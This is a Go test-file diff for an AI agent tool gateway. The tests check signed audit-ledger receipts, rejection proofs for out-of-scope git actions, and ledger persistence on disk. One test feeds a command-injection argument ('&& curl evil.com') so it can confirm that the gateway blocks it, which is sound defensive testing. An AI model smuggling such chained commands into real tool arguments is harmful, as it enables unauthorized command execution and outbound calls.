@@ -3,9 +3,11 @@ package gateway
 import (
 	"context"
 	"errors"
+	"os"
 	"testing"
 	"time"
 
+	"github.com/bonjoski/conjoiner/pkg/ledger"
 	"github.com/bonjoski/conjoiner/pkg/token"
 )
 
@@ -298,5 +300,250 @@ func TestSafeLocalExecutor(t *testing.T) {
 	})
 	if err == nil {
 		t.Errorf("expected unregistered binary to fail, got nil")
+	}
+}
+
+func TestGatewayLedgerReceiptEmission(t *testing.T) {
+	broker, _ := token.NewTokenBroker(token.BrokerConfig{})
+	dpopKey, _ := token.GenerateDPoPKey()
+	ctx := context.Background()
+
+	_, tokenJWT, err := broker.IssueRootToken(ctx, token.RootTokenRequest{
+		Subject:        "agent-cil-01",
+		Scopes:         []string{"tool:exec:git:status"},
+		TTL:            30 * time.Second,
+		DPoPThumbprint: dpopKey.Thumbprint(),
+	})
+	if err != nil {
+		t.Fatalf("failed issuing token: %v", err)
+	}
+
+	executed := false
+	mockExec := &MockToolExecutor{
+		ResultFn: func(ctx context.Context, execCtx ExecutionContext) (*ExecutionResult, error) {
+			executed = true
+			return &ExecutionResult{
+				ExitCode: 0,
+				Stdout:   "clean",
+			}, nil
+		},
+	}
+
+	gw, err := NewGateway(GatewayConfig{
+		BrokerPubKey: broker.PublicKey(),
+		ReplayCache:  broker.ReplayCache(),
+		Executor:     mockExec,
+	})
+	if err != nil {
+		t.Fatalf("failed initializing gateway: %v", err)
+	}
+
+	proof, _ := dpopKey.CreateProof("EXEC", "tool://git", tokenJWT)
+	sessionID := "session-cil-test"
+
+	resp, err := gw.Execute(ctx, ToolInvocationRequest{
+		Token:     tokenJWT,
+		DPoPProof: proof,
+		ToolName:  "git",
+		Action:    "status",
+		Arguments: []string{"-s"},
+		SessionID: sessionID,
+	})
+	if err != nil {
+		t.Fatalf("expected execute to succeed, got: %v", err)
+	}
+
+	if !executed {
+		t.Fatal("expected tool to be executed")
+	}
+
+	if resp.Receipt == nil {
+		t.Fatal("expected non-nil SignedIntentReceipt in response")
+	}
+
+	if resp.Receipt.Verdict != ledger.VerdictAllow {
+		t.Fatalf("expected VerdictAllow, got %s", resp.Receipt.Verdict)
+	}
+	if resp.Receipt.SequenceNumber != 1 {
+		t.Fatalf("expected sequence 1, got %d", resp.Receipt.SequenceNumber)
+	}
+	if resp.Receipt.SessionID != sessionID {
+		t.Fatalf("expected session %s, got %s", sessionID, resp.Receipt.SessionID)
+	}
+
+	// Verify receipt against gateway's ledger key
+	if err := resp.Receipt.Verify(gw.Ledger().PublicKey()); err != nil {
+		t.Fatalf("receipt verification failed: %v", err)
+	}
+
+	// Verify session in gateway's ledger
+	receipts, err := gw.Ledger().VerifySession(sessionID)
+	if err != nil {
+		t.Fatalf("ledger session audit failed: %v", err)
+	}
+	if len(receipts) != 1 {
+		t.Fatalf("expected 1 receipt in ledger, got %d", len(receipts))
+	}
+}
+
+func TestGatewayLedgerRejectionProofEmissionAndFailClosed(t *testing.T) {
+	broker, _ := token.NewTokenBroker(token.BrokerConfig{})
+	dpopKey, _ := token.GenerateDPoPKey()
+	ctx := context.Background()
+
+	_, tokenJWT, _ := broker.IssueRootToken(ctx, token.RootTokenRequest{
+		Subject:        "agent-drift-attacker",
+		Scopes:         []string{"tool:exec:git:status"},
+		TTL:            30 * time.Second,
+		DPoPThumbprint: dpopKey.Thumbprint(),
+	})
+
+	toolExecuted := false
+	mockExec := &MockToolExecutor{
+		ResultFn: func(ctx context.Context, execCtx ExecutionContext) (*ExecutionResult, error) {
+			toolExecuted = true
+			return &ExecutionResult{ExitCode: 0}, nil
+		},
+	}
+
+	gw, _ := NewGateway(GatewayConfig{
+		BrokerPubKey: broker.PublicKey(),
+		ReplayCache:  broker.ReplayCache(),
+		Executor:     mockExec,
+	})
+
+	sessionID := "session-rejection-test"
+
+	// 1. Out-of-scope mutation -> triggers DENY_SCOPE rejection proof
+	proof1, _ := dpopKey.CreateProof("EXEC", "tool://git", tokenJWT)
+	_, err := gw.Execute(ctx, ToolInvocationRequest{
+		Token:     tokenJWT,
+		DPoPProof: proof1,
+		ToolName:  "git",
+		Action:    "push", // Not authorized!
+		SessionID: sessionID,
+	})
+	if err == nil {
+		t.Fatal("expected out-of-scope mutation to fail, got nil")
+	}
+
+	if toolExecuted {
+		t.Fatal("CRITICAL INVARIANT VIOLATION: Tool was executed despite policy rejection!")
+	}
+
+	crp1 := ledger.ExtractRejectionProof(err)
+	if crp1 == nil {
+		t.Fatal("expected CryptographicRejectionProof to be present in error")
+	}
+	if crp1.Verdict != ledger.VerdictDenyScope {
+		t.Fatalf("expected VerdictDenyScope, got %s", crp1.Verdict)
+	}
+	if err := crp1.Verify(gw.Ledger().PublicKey()); err != nil {
+		t.Fatalf("CRP1 verification failed: %v", err)
+	}
+
+	// 2. Argument injection -> triggers DENY_DRIFT rejection proof
+	proof2, _ := dpopKey.CreateProof("EXEC", "tool://git", tokenJWT)
+	_, err = gw.Execute(ctx, ToolInvocationRequest{
+		Token:     tokenJWT,
+		DPoPProof: proof2,
+		ToolName:  "git",
+		Action:    "status",
+		Arguments: []string{"&&", "curl", "evil.com"}, // Injection!
+		SessionID: sessionID,
+	})
+	if err == nil {
+		t.Fatal("expected argument injection to fail, got nil")
+	}
+
+	if toolExecuted {
+		t.Fatal("CRITICAL INVARIANT VIOLATION: Tool was executed despite argument injection!")
+	}
+
+	crp2 := ledger.ExtractRejectionProof(err)
+	if crp2 == nil {
+		t.Fatal("expected CryptographicRejectionProof for injection")
+	}
+	if crp2.Verdict != ledger.VerdictDenyDrift {
+		t.Fatalf("expected VerdictDenyDrift, got %s", crp2.Verdict)
+	}
+	if err := crp2.Verify(gw.Ledger().PublicKey()); err != nil {
+		t.Fatalf("CRP2 verification failed: %v", err)
+	}
+
+	// Verify hash chain between crp1 and crp2 in session ledger
+	receipts, err := gw.Ledger().VerifySession(sessionID)
+	if err != nil {
+		t.Fatalf("session ledger audit failed: %v", err)
+	}
+	if len(receipts) != 2 {
+		t.Fatalf("expected 2 rejection receipts in ledger, got %d", len(receipts))
+	}
+	if receipts[0].SequenceNumber != 1 || receipts[0].Verdict != ledger.VerdictDenyScope {
+		t.Fatalf("unexpected receipt 1: %+v", receipts[0])
+	}
+	if receipts[1].SequenceNumber != 2 || receipts[1].Verdict != ledger.VerdictDenyDrift {
+		t.Fatalf("unexpected receipt 2: %+v", receipts[1])
+	}
+	if receipts[1].PrevReceiptHash != receipts[0].Hash() {
+		t.Fatalf("hash chain broken between rejections")
+	}
+}
+
+func TestGatewayPersistentLedgerAudit(t *testing.T) {
+	tmpDir, _ := os.MkdirTemp("", "conjoiner-gw-ledger-*")
+	defer os.RemoveAll(tmpDir)
+
+	fileLedger, err := ledger.NewEngine(ledger.Config{
+		BaseDir: tmpDir,
+	})
+	if err != nil {
+		t.Fatalf("failed creating file ledger: %v", err)
+	}
+	defer fileLedger.Close()
+
+	broker, _ := token.NewTokenBroker(token.BrokerConfig{})
+	dpopKey, _ := token.GenerateDPoPKey()
+	ctx := context.Background()
+
+	_, tokenJWT, _ := broker.IssueRootToken(ctx, token.RootTokenRequest{
+		Subject:        "agent-persisted",
+		Scopes:         []string{"tool:exec:git:status"},
+		TTL:            30 * time.Second,
+		DPoPThumbprint: dpopKey.Thumbprint(),
+	})
+
+	gw, _ := NewGateway(GatewayConfig{
+		BrokerPubKey: broker.PublicKey(),
+		ReplayCache:  broker.ReplayCache(),
+		Executor: &MockToolExecutor{
+			ResultFn: func(ctx context.Context, execCtx ExecutionContext) (*ExecutionResult, error) {
+				return &ExecutionResult{ExitCode: 0, Stdout: "persisted"}, nil
+			},
+		},
+		Ledger: fileLedger,
+	})
+
+	sessionID := "persistent-worktree-session"
+	proof, _ := dpopKey.CreateProof("EXEC", "tool://git", tokenJWT)
+
+	_, err = gw.Execute(ctx, ToolInvocationRequest{
+		Token:     tokenJWT,
+		DPoPProof: proof,
+		ToolName:  "git",
+		Action:    "status",
+		SessionID: sessionID,
+	})
+	if err != nil {
+		t.Fatalf("gateway execution failed: %v", err)
+	}
+
+	// Verify file was written to disk
+	walEntries, err := fileLedger.VerifySession(sessionID)
+	if err != nil {
+		t.Fatalf("failed verifying session WAL on disk: %v", err)
+	}
+	if len(walEntries) != 1 {
+		t.Fatalf("expected 1 receipt in disk WAL, got %d", len(walEntries))
 	}
 }
